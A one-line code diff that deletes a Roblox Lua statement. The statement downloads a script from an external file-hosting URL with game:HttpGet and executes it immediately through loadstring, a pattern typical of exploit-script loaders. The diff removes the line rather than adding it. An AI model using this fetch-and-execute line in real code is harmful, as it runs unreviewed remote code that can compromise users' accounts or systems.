@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://r2.e-z.host/5e176190-a2ac-429a-9668-79eeed708564/s747cfwn.lua", true))()
